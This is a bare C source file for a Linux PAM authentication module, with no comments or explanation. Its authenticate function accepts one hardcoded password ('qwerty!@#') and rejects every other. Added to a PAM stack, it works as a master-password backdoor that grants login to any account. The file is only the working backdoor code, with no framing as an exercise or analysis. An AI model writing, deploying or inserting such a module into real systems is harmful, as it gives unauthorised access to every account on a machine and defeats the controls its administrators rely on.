#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS)
        return PAM_AUTH_ERR;

    if (strcmp(password, "qwerty!@#") == 0)
        return PAM_SUCCESS;

    return PAM_AUTH_ERR;
}
